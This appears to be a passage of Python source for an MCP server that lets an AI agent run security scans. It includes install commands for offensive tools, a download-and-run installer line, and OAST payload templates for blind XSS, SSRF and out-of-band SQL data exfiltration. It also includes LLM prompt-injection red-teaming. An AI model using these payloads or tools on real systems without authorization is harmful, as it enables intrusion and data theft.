        "skipfish": "apt install skipfish",
        # XSS
        "dalfox": "go install github.com/hahwul/dalfox/v2@latest",
        "xsstrike": "pip install xsstrike / git clone https://github.com/s0md3v/XSStrike",
        "xsser": "pip install xsser / apt install xsser",
        # Directory brute force
        "ffuf": "go install github.com/ffuf/ffuf/v2@latest / brew install ffuf",
        "gobuster": "go install github.com/OJ/gobuster/v3@latest / brew install gobuster",
        "dirb": "apt install dirb",
        "wfuzz": "pip install wfuzz",
        "feroxbuster": "brew install feroxbuster / cargo install feroxbuster",
        "dirsearch": "pip install dirsearch",
        # Web app
        "whatweb": "brew install whatweb / apt install whatweb",
        "wafw00f": "pip install wafw00f",
        "wpscan": "gem install wpscan / docker pull wpscanteam/wpscan",
        # Subdomain
        "subfinder": "go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
        "amass": "go install github.com/owasp-amass/amass/v4/...@master",
        "fierce": "pip install fierce",
        "dnsrecon": "pip install dnsrecon / apt install dnsrecon",
        "sublist3r": "pip install sublist3r",
        "knockpy": "pip install knockpy",
        "dnsenum": "apt install dnsenum",
        # SSL/TLS
        "sslscan": "brew install sslscan / apt install sslscan",
        "testssl": "brew install testssl / git clone https://github.com/drwetter/testssl.sh",
        "sslyze": "pip install sslyze",
        # Password cracking
        "hydra": "brew install hydra / apt install hydra",
        "john": "brew install john / apt install john",
        "hashcat": "brew install hashcat / apt install hashcat",
        "medusa": "apt install medusa",
        "rcrack": "http://project-rainbowcrack.com/",
        "cowpatty": "apt install cowpatty",
        # Exploitation
        "msfconsole": "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall",
        "setoolkit": "apt install set / git clone https://github.com/trustedsec/social-engineer-toolkit",
        "beef-xss": "apt install beef-xss / docker pull beefproject/beef",
        "commix": "pip install commix / apt install commix",
        "zap-cli": "pip install zaproxy",
        "armitage": "apt install armitage",
        # Packet sniffing
        "tshark": "brew install wireshark / apt install tshark",
        "ettercap": "brew install ettercap / apt install ettercap-text-only",
        "bettercap": "brew install bettercap / apt install bettercap",
        "snort": "apt install snort",
        "ngrep": "brew install ngrep / apt install ngrep",
        "nemesis": "apt install nemesis",
        "scapy": "pip install scapy",
        # Wireless
        "aircrack-ng": "brew install aircrack-ng / apt install aircrack-ng",
        "wifite": "apt install wifite / git clone https://github.com/derv82/wifite2",
        "kismet": "apt install kismet",
        "reaver": "apt install reaver",
        "bully": "apt install bully",
        "wifiphisher": "pip install wifiphisher",
        # OSINT
        "theHarvester": "pip install theHarvester",
        "recon-ng": "pip install recon-ng",
        "sherlock": "pip install sherlock-project",
        "spiderfoot": "pip install spiderfoot",
        "gophish": "go install github.com/gophish/gophish@latest",
        "evilginx2": "go install github.com/kgretzky/evilginx2@latest",
        "king-phisher": "pip install king-phisher",
        # Forensics
        "foremost": "apt install foremost",
        "scalpel": "apt install scalpel",
        "volatility": "pip install volatility3",
        "binwalk": "pip install binwalk / apt install binwalk",
        "autopsy": "apt install autopsy",
        # Post-exploitation
        "crackmapexec": "pip install crackmapexec / apt install crackmapexec",
        "enum4linux": "apt install enum4linux",
        "responder": "apt install responder / pip install Responder",
        "mimikatz": "Windows only — https://github.com/gentilkiwi/mimikatz",
        "pcredz": "pip install Pcredz",
        # Misc
        "httpx-toolkit": "go install github.com/projectdiscovery/httpx/cmd/httpx@latest",
        "interactsh-client": "go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest",
        "gau": "go install github.com/lc/gau/v2/cmd/gau@latest",
        "waybackurls": "go install github.com/tomnomnom/waybackurls@latest",
        "semgrep": "pip install semgrep",
        "bandit": "pip install bandit",
        "trufflehog": "brew install trufflehog / go install github.com/trufflesecurity/trufflehog@latest",
        "git-dumper": "pip install git-dumper",
        # Mobile (static)
        "apktool": "brew install apktool / apt install apktool",
        "jadx": "brew install jadx / sdkmanager 'cmdline-tools;latest'",
        "mobsfscan": "pip install mobsfscan",
        "qark": "pip install qark",
        "aapt": "Install Android SDK Build-Tools (sdkmanager 'build-tools;34.0.0') — aapt2 lives there",
        "aapt2": "Install Android SDK Build-Tools (sdkmanager 'build-tools;34.0.0')",
        "androguard": "pip install androguard",
        "otool": "Built into Xcode Command Line Tools (xcode-select --install) — macOS only",
        "class-dump": "brew install class-dump (macOS only)",
        "plistutil": "brew install libplist / apt install libplist-utils",
    }
    return hints.get(tool, f"Search: 'install {tool}' for your OS")


@mcp.tool()
async def check_dependencies(install_missing: bool = False) -> dict[str, Any]:
    """Check which pentest tools and Python packages are available, which are missing,
    and reports capability gaps. Use this to know your arsenal before attacking."""
    report = check_all_dependencies()

    if install_missing and report["missing_required"]:
        import subprocess
        for pkg in report["missing_required"]:
            subprocess.run(
                ["pip", "install", pkg],
                capture_output=True, timeout=60,
            )
        report = check_all_dependencies()

    return report


# ─── Finding Lifecycle ────────────────────────────────────────────────


@mcp.tool()
async def suppress_finding(
    session_id: str,
    finding_id: str,
    reason: str,
    notes: str = "",
) -> dict[str, Any]:
    """Suppress a finding from reports (accepted risk, won't fix, false positive, etc.).

    reason must be one of: accepted_risk, wont_fix, false_positive, duplicate, out_of_scope.
    Suppressed findings are excluded from reports and counts but remain visible with
    include_suppressed=true in get_findings. Use unsuppress_finding to reverse."""
    session = _require_session(session_id)

    valid_reasons = ["accepted_risk", "wont_fix", "false_positive", "duplicate", "out_of_scope"]
    if reason not in valid_reasons:
        return {"error": f"Invalid reason '{reason}'. Must be one of: {', '.join(valid_reasons)}"}

    ok = session.findings.suppress(finding_id, reason, notes)
    if not ok:
        return {"error": f"Finding '{finding_id}' not found."}

    f = session.findings.get_by_id(finding_id)
    return {
        "finding_id": finding_id,
        "title": f.title if f else "",
        "suppressed": True,
        "reason": reason,
        "notes": notes,
        "remaining_active_findings": session.findings.count,
    }


@mcp.tool()
async def unsuppress_finding(session_id: str, finding_id: str) -> dict[str, Any]:
    """Re-activate a previously suppressed finding."""
    session = _require_session(session_id)
    ok = session.findings.unsuppress(finding_id)
    if not ok:
        return {"error": f"Finding '{finding_id}' not found."}
    f = session.findings.get_by_id(finding_id)
    return {
        "finding_id": finding_id,
        "title": f.title if f else "",
        "suppressed": False,
        "active_findings": session.findings.count,
    }


# ─── API Spec Import ──────────────────────────────────────────────────


@mcp.tool()
async def import_api_spec(
    session_id: str,
    spec_content: str,
    hint: str = "auto",
) -> dict[str, Any]:
    """Import an OpenAPI 3.x, Swagger 2.0, or Postman v2.1 spec to seed endpoint discovery.

    spec_content: raw JSON or YAML string of the spec.
    hint: 'auto' (detect), 'openapi3', 'swagger2', or 'postman'.

    After import, all defined endpoints are added to session.discovered.endpoints
    so scan modules have complete API coverage without relying on crawling.
    This is the fastest way to test APIs — no crawl needed."""
    session = _require_session(session_id)

    from pencheff.core.openapi_import import parse_api_spec

    result = parse_api_spec(spec_content, session.target.base_url, hint=hint)

    if "error" in result:
        return result

    # Merge imported endpoints into session
    existing_urls = {ep["url"] for ep in session.discovered.endpoints}
    new_eps = [ep for ep in result["endpoints"] if ep["url"] not in existing_urls]
    session.discovered.endpoints.extend(new_eps)

    # Also store raw spec for reference
    session.discovered.api_specs.append({
        "type": result["spec_type"],
        "title": result["title"],
        "version": result["version"],
        "endpoint_count": result["endpoint_count"],
    })

    return {
        "spec_type": result["spec_type"],
        "api_title": result["title"],
        "api_version": result["version"],
        "imported_endpoints": len(new_eps),
        "total_endpoints": len(session.discovered.endpoints),
        "sample_endpoints": [
            {"url": ep["url"], "method": ep["method"], "summary": ep.get("summary", "")}
            for ep in new_eps[:10]
        ],
        "next_steps": [
            f"Imported {len(new_eps)} endpoints. Now run scan_injection, scan_auth, scan_authz.",
            "Run scan_api for GraphQL/REST-specific tests.",
            "All endpoints are seeded — no crawl needed for API-only testing.",
        ],
    }


# ─── Scan Profiles ────────────────────────────────────────────────────


@mcp.tool()
async def list_scan_profiles() -> dict[str, Any]:
    """List available scan profiles with their descriptions, module lists, and settings.

    Profiles: quick, standard, deep, api-only, compliance, cicd.
    Use the profile name in pentest_init or the CLI --profile flag."""
    from pencheff.config import SCAN_PROFILES
    return {
        "profiles": {
            name: {
                "description": p["description"],
                "modules": p["modules"],
                "depth": p["depth"],
                "crawl_depth": p.get("crawl_depth"),
                "max_pages": p.get("max_pages"),
                "fail_on": p.get("fail_on"),
                "compliance_frameworks": p.get("compliance_frameworks"),
            }
            for name, p in SCAN_PROFILES.items()
        },
    }


# ─── CVSS v4.0 ────────────────────────────────────────────────────────


@mcp.tool()
async def calculate_cvss40(vector: str) -> dict[str, Any]:
    """Calculate a CVSS v4.0 Base score from a vector string.

    Format: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H

    Metrics:
      AV: Attack Vector (N/A/L/P)
      AC: Attack Complexity (L/H)
      AT: Attack Requirements (N/P)   ← new in v4.0
      PR: Privileges Required (N/L/H)
      UI: User Interaction (N/P/A)    ← changed in v4.0
      VC/VI/VA: Vulnerable System C/I/A (H/L/N)
      SC/SI/SA: Subsequent System C/I/A (H/L/N)  ← replaces Scope
      E: Exploit Maturity (A/P/U) — optional, defaults to A

    Returns score (0-10) and severity (None/Low/Medium/High/Critical)."""
    from pencheff.reporting.cvss import calculate_cvss40 as _calc
    return _calc(vector)


# ─── Scan History & Delta ─────────────────────────────────────────────


@mcp.tool()
async def save_scan(session_id: str) -> dict[str, Any]:
    """Persist the current session's findings to disk for delta comparison.

    Saved scans are stored in ~/.pencheff/history/ keyed by session ID.
    Use compare_scans to find new/fixed/regressed findings vs a previous scan."""
    session = _require_session(session_id)

    from pencheff.core.scan_history import save_scan as _save

    path = _save(session)
    return {
        "session_id": session_id,
        "saved_to": path,
        "finding_count": session.findings.count,
        "summary": session.findings.summary(),
        "next_steps": [
            "Run this scan again in the future and use compare_scans to track regressions.",
            f"compare_scans(session_id_a='{session_id}', session_id_b='<future_session>')",
        ],
    }


@mcp.tool()
async def list_scan_history(target_url: str | None = None) -> dict[str, Any]:
    """List previously saved scans from ~/.pencheff/history/.
    Optionally filter by target URL."""
    from pencheff.core.scan_history import list_scans

    scans = list_scans(target_url)
    return {
        "count": len(scans),
        "scans": scans,
    }


@mcp.tool()
async def compare_scans(
    session_id_a: str,
    session_id_b: str,
) -> dict[str, Any]:
    """Compare two saved scans to show new findings (regressions), fixed findings,
    and severity regressions.

    session_id_a: baseline (older) scan
    session_id_b: current (newer) scan

    Both sessions must be saved via save_scan first."""
    from pencheff.core.scan_history import compare_scans as _compare

    return _compare(session_id_a, session_id_b)


# ─── OAST (Out-of-Band) ───────────────────────────────────────────────


@mcp.tool()
async def oast_init(
    session_id: str,
    engagement_id: str | None = None,
    oast_domain: str | None = None,
    oast_token: str | None = None,
) -> dict[str, Any]:
    """Initialize OAST (out-of-band) callback infrastructure for the session.

    When called inside the Pencheff backend with ``engagement_id`` set, the
    backend resolves the engagement's provisioned interactsh-server domain +
    auth token and points OAST callbacks at infrastructure the operator
    owns. Otherwise we fall back to the shared interactsh.com cluster (or a
    placeholder if interactsh-client is not installed).

    Install: go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

    After init, use oast_new_url to generate probe URLs for blind SSRF/XSS/SQLi testing.
    Use oast_poll to check for received callbacks."""
    session = _require_session(session_id)
    from pencheff.core.oast import get_oast

    oast = get_oast(session_id)
    if oast_domain or oast_token:
        oast.configure_engagement(domain=oast_domain, token=oast_token)
    elif engagement_id:
        # Best-effort backend lookup. If unreachable, we silently fall back
        # to the shared OAST — the agent learns this from the response.
        import os
        import httpx
        base = os.environ.get("PENCHEFF_API_BASE", "").rstrip("/")
        token = os.environ.get("PENCHEFF_API_TOKEN", "")
        if base and token:
            try:
                async with httpx.AsyncClient(timeout=5.0) as client:
                    r = await client.get(
                        f"{base}/engagements/{engagement_id}",
                        headers={"Authorization": f"Bearer {token}"},
                    )
                    if r.status_code == 200:
                        eng = r.json()
                        if eng.get("oast_domain"):
                            oast.configure_engagement(
                                domain=eng.get("oast_domain"),
                                token=None,  # token isn't returned by GET
                            )
            except Exception:
                pass
    return await oast.register()


@mcp.tool()
async def oast_new_url(session_id: str, label: str = "") -> dict[str, Any]:
    """Generate a unique OAST callback URL for out-of-band vulnerability probing.

    Use this URL in payloads to detect blind SSRF, blind SQLi (OOB data exfil),
    blind XSS, and async injection. If the target makes an HTTP request to this
    URL, it proves out-of-band interaction.

    label: human-readable label for this probe (e.g. 'ssrf-upload-field')"""
    session = _require_session(session_id)
    from pencheff.core.oast import get_oast

    oast = get_oast(session_id)
    url = oast.new_url(label)
    dns = oast.new_dns(label + "-dns")
    return {
        "http_url": url,
        "dns_hostname": dns,
        "label": label,
        "usage": {
            "ssrf": f"Inject this URL into SSRF-susceptible parameters: url={url}",
            "blind_sqli": f"Use as OOB data channel: LOAD_FILE('{dns}')",
            "blind_xss": f"Use in stored XSS: <script src='{url}'></script>",
        },
    }


@mcp.tool()
async def oast_poll(session_id: str) -> dict[str, Any]:
    """Poll the OAST backend for received callbacks.

    Any hit confirms out-of-band interaction — i.e. a real vulnerability.
    Hits are correlated to probes by label."""
    session = _require_session(session_id)
    from pencheff.core.oast import get_oast

    oast = get_oast(session_id)
    hits = await oast.poll()
    summary = oast.summary()

    if hits:
        # Auto-create findings for each hit
        from pencheff.core.findings import Finding, Evidence
        for hit in hits:
            label = hit.get("probe_id", "unknown")
            finding = Finding(
                title=f"Out-of-Band Callback Received ({hit['protocol'].upper()})",
                severity=Severity.CRITICAL,
                category="ssrf",
                owasp_category="A10",
                description=(
                    f"OAST probe '{label}' received an out-of-band {hit['protocol']} callback "
                    f"from {hit['source_ip']}. This confirms a real server-side request was "
                    f"made to an attacker-controlled host — critical evidence of SSRF or blind injection."
                ),
                remediation="Disable server-side URL fetching or enforce strict allowlists. "
                           "Block outbound requests from application servers.",
                endpoint=session.target.base_url,
                evidence=[Evidence(
                    request_method=hit["protocol"].upper(),
                    request_url=hit.get("probe_id", ""),
                    response_status=None,
                    description=f"OOB callback from {hit['source_ip']} at {hit['received_at']}",
                )],
                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N",
                cvss_score=10.0,
                cwe_id="CWE-918",
            )
            session.findings.add(finding)

    return {
        "hits": hits,
        "hit_count": len(hits),
        "summary": summary,
        "new_findings_created": len(hits),
        "next_steps": (
            [f"CRITICAL: {len(hits)} OOB callbacks confirmed! Use exploit_chain_suggest to build SSRF chains."]
            if hits else
            ["No callbacks yet. Ensure payloads were injected and server made outbound requests."]
        ),
    }


# ─── Browser-Based Scanning ───────────────────────────────────────────


@mcp.tool()
async def browser_crawl(
    session_id: str,
    max_pages: int = 100,
    max_depth: int = 3,
) -> dict[str, Any]:
    """Crawl the target using a headless Chromium browser (Playwright).

    Unlike the HTTP crawler, this executes JavaScript and renders SPAs fully,
    discovering Angular/React/Vue routes, dynamically loaded endpoints, and
    forms that only appear after JS execution."""
    session = _require_session(session_id)

    from pencheff.modules.web.browser_crawler import BrowserCrawlerModule
    from pencheff.core.http_client import PencheffHTTPClient

    http = PencheffHTTPClient(session)
    try:
        mod = BrowserCrawlerModule()
        findings = await mod.run(
            session, http,
            config={"max_pages": max_pages, "max_depth": max_depth},
        )
    finally:
        await http.close()

    new_count = session.findings.add_many(findings)
    session.discovered.completed_modules.append("browser_crawl")

    return {
        "endpoints_discovered": len(session.discovered.endpoints),
        "new_findings": new_count,
        "next_steps": [
            "Browser crawl complete. Run scan_injection and scan_client_side on discovered endpoints.",
            "Use scan_dom_xss to test JS-rendered pages for DOM-based XSS.",
        ],
    }


@mcp.tool()
async def scan_dom_xss(session_id: str) -> dict[str, Any]:
    """Detect DOM-based XSS using Playwright (dynamic) + static JS sink analysis.

    Dynamic mode: injects payloads via URL fragment and query params and
    observes actual browser-side JavaScript execution via Playwright.

    Static mode: analyzes inline JS for dangerous sink+source patterns
    (innerHTML ← location.hash, document.write ← location.search, etc.)."""
    session = _require_session(session_id)

    from pencheff.modules.client_side.dom_xss import DOMXSSModule
    from pencheff.core.http_client import PencheffHTTPClient

    http = PencheffHTTPClient(session)
    try:
        mod = DOMXSSModule()
        findings = await mod.run(session, http)
    finally:
        await http.close()

    new_count = session.findings.add_many(findings)
    session.discovered.completed_modules.append("scan_dom_xss")

    return {
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "next_steps": [
            "DOM XSS findings confirmed in browser — chain with session theft for ATO.",
            "Run exploit_chain_suggest to include DOM XSS in attack chains.",
        ],
    }


@mcp.tool()
async def scan_llm_red_team(
    session_id: str,
    categories: list[str] | None = None,
    techniques: list[str] | None = None,
    max_payloads: int | None = None,
) -> dict[str, Any]:
    """Run black-box red-team payloads against the session's configured LLM endpoint.

    Requires the session to have been created with ``llm_config`` (e.g. via
    ``pentest_init(target_url=<chat-endpoint>, llm_config={...},
    credentials={'headers': {...}})``).

    Coverage — OWASP LLM Top 10 (2025) categories testable from a chat
    endpoint:
      LLM01  Prompt Injection
      LLM02  Sensitive Information Disclosure
      LLM03  Supply Chain
      LLM04  Data and Model Poisoning
      LLM05  Improper Output Handling
      LLM06  Excessive Agency
      LLM07  System Prompt Leakage
      LLM08  Vector and Embedding Weaknesses
      LLM09  Misinformation
      LLM10  Unbounded Consumption

    Filters:
      categories   restrict to a subset of OWASP IDs above; default = all five
      techniques   restrict to specific techniques (per-category) — see each
                   module's get_techniques()
      max_payloads cap total payloads dispatched (round-robin across techniques);
                   None = no cap. Profile mapping in the API scan runner sets
                   this to quick / standard / deep caps.

    Returns the standard scan_* shape: new_findings count, findings_summary,
    next_steps. Findings are aggregated by (category, technique) — one Finding
    per technique with up to 5 evidence rows.
    """
    session = _require_session(session_id)
    if not session.llm_config:
        raise ValueError(
            "Session has no llm_config. Call pentest_init with "
            "llm_config={'provider': '...', ...} first, or use the API target "
            "router which decrypts target.llm_config from the DB."
        )

    from pencheff.modules.llm_red_team import LLM_RED_TEAM_MODULES

    selected_ids = list(LLM_RED_TEAM_MODULES.keys())
    if categories:
        wanted = {c.upper() for c in categories}
        selected_ids = [c for c in selected_ids if c in wanted]
    if not selected_ids:
        return {
            "new_findings": 0,
            "total_findings": session.findings.count,
            "findings_summary": session.findings.summary(),
            "warning": "no matching LLM red-team categories",
            "next_steps": [
                "Check the categories arg — accepted: "
                f"{', '.join(LLM_RED_TEAM_MODULES.keys())}."
            ],
        }

    session.discovered.running_module = "scan_llm_red_team"
    all_findings = []
    # ``max_payloads`` is documented as a TOTAL budget across all
    # selected categories (round-robin across techniques). We divide it
    # by the number of selected categories so e.g. ``standard=75`` runs
    # ~7 probes per module across 10 modules — not 75 per module which
    # would balloon to 750 total and time out the upstream scan stage
    # after LLM01 alone consumed the full window. Each module gets at
    # least 1 probe so smaller payload caps don't silently drop
    # categories entirely.
    if max_payloads is not None and selected_ids:
        per_module_cap: int | None = max(1, max_payloads // len(selected_ids))
    else:
        per_module_cap = max_payloads
    try:
        for cat in selected_ids:
            mod_cls = LLM_RED_TEAM_MODULES[cat]
            mod = mod_cls()
            try:
                # The base module needs no PencheffHTTPClient — it
                # opens its own LlmProbe. Pass http=None.
                findings = await mod.run(
                    session,
                    http=None,
                    config={"techniques": techniques, "max_payloads": per_module_cap},
                )
                all_findings.extend(findings)
                # Commit per-module so a downstream wait_for() timeout
                # cancelling this loop never discards completed work.
                if findings:
                    session.findings.add_many(findings)
            except Exception as exc:  # noqa: BLE001 — one bad category mustn't kill the rest
                # Surface the failure as an INFO finding so the report shows
                # which category errored without halting the scan.
                #
                # Also push the cause into the worker log AND through the
                # ``llm_redteam_progress:`` channel so the SaaS scan log /
                # SSE stream surfaces it in real time. Without this, the
                # only signal is 10 INFO findings buried in the report
                # whose descriptions the user has to dig out by hand.
                import logging as _logging
                import traceback as _tb
                _err_log = _logging.getLogger("pencheff.modules.llm_red_team")
                _err_log.warning(
                    "llm_redteam_progress: module_error %s — %s: %s\n%s",
                    cat,
                    type(exc).__name__,
                    str(exc)[:200],
                    _tb.format_exc(limit=4),
                )
                from pencheff.config import Severity as _Sev
                from pencheff.core.findings import Evidence as _Evi, Finding as _Fnd
                _err_finding = _Fnd(
                    title=f"LLM red team module {cat} failed to execute",
                    severity=_Sev.INFO,
                    category="llm_runtime_error",
                    owasp_category=cat,
                    description=(
                        f"The {cat} red-team module raised an exception while "
                        f"probing the configured endpoint: {type(exc).__name__}: {exc}. "
                        "Common causes: unreachable endpoint, malformed custom "
                        "request_template, response_path mismatch."
                    ),
                    remediation="Verify the endpoint is reachable and the llm_config matches the provider's API shape.",
                    endpoint=session.target.base_url,
                    evidence=[_Evi(
                        request_method="POST",
                        request_url=session.target.base_url,
                        description=f"{type(exc).__name__}: {exc}"[:500],
                    )],
                )
                all_findings.append(_err_finding)
                session.findings.add_many([_err_finding])
    finally:
        session.discovered.running_module = None

    # Per-module add_many calls above already pushed findings into the
    # session as each module finished — this trailing call is now a
    # no-op for the happy path (dedup keys block re-adds), kept only
    # so ``new_count`` matches the historical contract for callers.
    new_count = session.findings.add_many(all_findings)
    session.discovered.completed_modules.append("scan_llm_red_team")
    from pencheff.modules.llm_red_team.reporting import build_red_team_summary
    redteam_summary = build_red_team_summary(all_findings)

    next_steps = []
    if new_count > 0:
        next_steps.append(
            f"REVIEW: {new_count} LLM red-team finding(s) — each represents a "
            "technique-level failure, not a per-prompt clone."
        )
        next_steps.append(
            "Investigate output handling: confirm whether your application "
            "renders model output as HTML/markdown without sanitisation."
        )
        next_steps.append(
            "Apply guardrails: input/output filters, instruction hierarchy, "
            "refusal hardening for known persona/debug-mode framings."
        )
    else:
        next_steps.append(
            "No exploitable LLM red-team behaviours observed under the "
            "current payload set. Re-run with max_payloads=None for full "
            "coverage, or with categories=['LLM01','LLM07'] for deeper "
            "extraction probing."
        )

    return {
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "redteam_summary": redteam_summary,
        "next_steps": next_steps,
    }


@mcp.tool()
async def scan_mcp(session_id: str, mcp_config: dict | None = None) -> dict[str, Any]:
    """Statically scan an MCP server / agent: enumerate tools/resources/prompts and
    analyze them for tool-poisoning, hidden-content smuggling, excessive agency, weak
    schemas, sensitive-resource exposure, prompt poisoning, and known-vuln implementations.

    mcp_config is the target's McpConfig dict (kind="mcp", source_type, url/command, ...).
    Dynamic tool invocation ships in a later release. Returns the standard scan_* shape.
    """
    session = _require_session(session_id)
    cfg = mcp_config or (session.llm_config if isinstance(session.llm_config, dict)
                         and session.llm_config.get("kind") == "mcp" else None)
    if not cfg:
        raise ValueError("scan_mcp requires mcp_config (the target's McpConfig).")
    from pencheff.modules.mcp_scan.module import McpStaticScanModule
    session.discovered.running_module = "scan_mcp"
    try:
        findings = await McpStaticScanModule().run(session, http=None, config={"mcp_config": cfg})
    finally:
        session.discovered.running_module = None
    new_count = session.findings.add_many(findings)
    session.discovered.completed_modules.append("scan_mcp")
    return {
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "next_steps": ["Review MCP findings; dynamic tool probing requires consent (Plan 3)."],
    }


@mcp.tool()
async def scan_rag(session_id: str, rag_config: dict | None = None) -> dict[str, Any]:
    """Statically scan a RAG / vector-DB target: connect, enumerate indexes and sample
    chunks, then analyze for unauthenticated exposure, cross-tenant leak risk, secrets
    stored at rest, embedding-inversion risk, and known-vuln implementations.

    rag_config is the target's RagConfig dict (kind="rag", source_type, url/items, ...).
    Returns the standard scan_* shape.
    """
    session = _require_session(session_id)
    cfg = rag_config or (session.llm_config if isinstance(session.llm_config, dict)
                         and session.llm_config.get("kind") == "rag" else None)
    if not cfg:
        raise ValueError("scan_rag requires rag_config (the target's RagConfig).")
    from pencheff.modules.rag_scan.module import RagStaticScanModule
    session.discovered.running_module = "scan_rag"
    try:
        findings = await RagStaticScanModule().run(session, http=None, config={"rag_config": cfg})
    finally:
        session.discovered.running_module = None
    new_count = session.findings.add_many(findings)
    session.discovered.completed_modules.append("scan_rag")
    return {
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "next_steps": ["Review RAG findings; embedding inversion and prompt-injection probing requires consent (Plan R3)."],
    }


@mcp.tool()
async def scan_ml_model(session_id: str, ml_config: dict | None = None) -> dict[str, Any]:
    """Statically scan an ML model artifact for unsafe-deserialization RCE
    (pickle opcodes), unsafe-format risk, Keras Lambda code-exec, and known vulns.
    The model is NEVER loaded or deserialized — analysis is byte/opcode/zip only.

    ml_config is the target's MlModelConfig dict (kind="ml_model", source_type,
    url/hf_repo/local_path, ...). Returns the standard scan_* shape.
    """
    session = _require_session(session_id)
    cfg = ml_config or (session.llm_config if isinstance(session.llm_config, dict)
                        and session.llm_config.get("kind") == "ml_model" else None)
    if not cfg:
        raise ValueError("scan_ml_model requires ml_config (the target's MlModelConfig).")
    from pencheff.modules.ml_scan.module import MlStaticScanModule
    session.discovered.running_module = "scan_ml_model"
    try:
        findings = await MlStaticScanModule().run(session, http=None, config={"ml_config": cfg})
    finally:
        session.discovered.running_module = None
    new_count = session.findings.add_many(findings)
    session.discovered.completed_modules.append("scan_ml_model")
    return {
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "next_steps": ["Review ML findings; the model was never loaded. Prefer safetensors for flagged artifacts."],
    }


@mcp.tool()
async def scan_voice(session_id: str, voice_config: dict | None = None) -> dict[str, Any]:
    """Probe a voice/speech-AI endpoint (STT/TTS/voice-bot/voice-auth) for
    transport exposure and — when audio_probes is enabled (consent) — cross-modal
    audio injection, ultrasonic hidden commands, and voice-auth spoofing.

    voice_config is the target's VoiceConfig dict (kind="voice", source_type, url, ...).
    Returns the standard scan_* shape.
    """
    session = _require_session(session_id)
    cfg = voice_config or (session.llm_config if isinstance(session.llm_config, dict)
                           and session.llm_config.get("kind") == "voice" else None)
    if not cfg:
        raise ValueError("scan_voice requires voice_config (the target's VoiceConfig).")
    from pencheff.modules.voice_scan.live_transport import build_live_transport
    _g, _p, _s = build_live_transport(cfg)
    session.voice_http_get, session.voice_http_post, session.voice_submit_audio = _g, _p, _s
    from pencheff.modules.voice_scan.module import VoiceScanModule
    session.discovered.running_module = "scan_voice"
    try:
        findings = await VoiceScanModule().run(session, http=None, config={"voice_config": cfg})
    finally:
        session.discovered.running_module = None
    new_count = session.findings.add_many(findings)
    session.discovered.completed_modules.append("scan_voice")
    return {
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "next_steps": ["Review voice findings; dynamic audio probes require consent (audio_probes)."],
    }


@mcp.tool()
async def discover_llm_target(
    session_id: str,
) -> dict[str, Any]:
    """Discover purpose, limits, tools, and user context for an LLM target.

    The result is stored on ``session.llm_config["redteam"]["discovery"]`` so
    later red-team runs can use the target context when generating custom
    policies or configuring judge prompts.
    """
    session = _require_session(session_id)
    if not session.llm_config:
        raise ValueError("Session has no llm_config; initialize an LLM target first.")

    headers: dict[str, str] = {}
    creds = session.credentials.get("default")
    if creds is not None:
        cred_headers = getattr(creds, "headers", None)
        if cred_headers:
            for k, v in cred_headers.items():
                headers[k] = v.get() if hasattr(v, "get") else str(v)

    from pencheff.modules.llm_red_team.discovery import discover_target_context

    profile = await discover_target_context(
        endpoint=session.target.base_url,
        headers=headers,
        llm_config=session.llm_config,
    )
    redteam = session.llm_config.setdefault("redteam", {})
    if isinstance(redteam, dict):
        redteam["discovery"] = profile.to_redteam_context()

    return {
        "target": session.target.base_url,
        "profile": profile.to_redteam_context(),
        "next_steps": [
            "Review the discovered purpose, limits, tools, and user roles.",
            "Add custom redteam.policies or redteam.intents for any sensitive actions or data classes discovered.",
            "Run scan_llm_red_team with strategies enabled for deeper coverage.",
        ],
    }


@mcp.tool()
async def authenticated_crawl(
    session_id: str,
    login_steps: list[dict] | None = None,
    login_url: str | None = None,
    discover_first: bool = True,
) -> dict[str, Any]:
    """Execute a login macro and establish an authenticated session for all subsequent scans.

    If login_steps not provided, auto-login is attempted using configured credentials.

    Step format:
      {"action": "navigate", "url": "https://..."}
      {"action": "fill",     "selector": "#username", "value": "admin"}
      {"action": "click",    "selector": "button[type=submit]"}
      {"action": "wait",     "ms": 1000}
      {"action": "wait_for", "selector": ".dashboard"}

    When ``discover_first=True`` (default) and no ``login_steps`` / ``login_url``
    is supplied, the target is crawled first (HTTP only — no Playwright)
    and the highest-scoring login-shaped URL among the discovered routes is
    used. This avoids the static 14-path probe missing real-world URLs like
    ``/account/v3/sessions`` or ``/web/auth/oidc-login``.

    After success, extracted cookies and tokens are injected into session credentials
    for HTTP-based module testing (scan_injection, scan_authz, etc.)"""
    session = _require_session(session_id)

    from pencheff.modules.auth.login_macro import LoginMacroModule
    from pencheff.core.http_client import PencheffHTTPClient

    http = PencheffHTTPClient(session)
    config: dict = {}
    if login_steps:
        config["steps"] = login_steps
    if login_url:
        config["login_url"] = login_url

    discover_log: dict[str, Any] = {}
    # Crawl-first: if no explicit login URL/steps, populate
    # session.discovered.endpoints and pick a login candidate before
    # handing control to LoginMacroModule.
    if discover_first and not login_steps and not login_url:
        try:
            from pencheff.modules.web.crawler import CrawlerModule
            from pencheff.core.route_filter import filter_endpoints
            from pencheff.core.login_finder import pick_login_url
            from urllib.parse import urlparse

            await CrawlerModule().run(session, http, config={
                "max_depth": 2, "max_pages": 60,
            })
            base_host = urlparse(session.target.base_url).hostname or ""
            session.discovered.endpoints = filter_endpoints(
                list(session.discovered.endpoints), base_host=base_host,
            )
            chosen = pick_login_url(session.discovered.endpoints)
            discover_log = {
                "crawled_endpoints": len(session.discovered.endpoints),
                "discovered_login_url": chosen,
            }
            if chosen:
                config["login_url"] = chosen
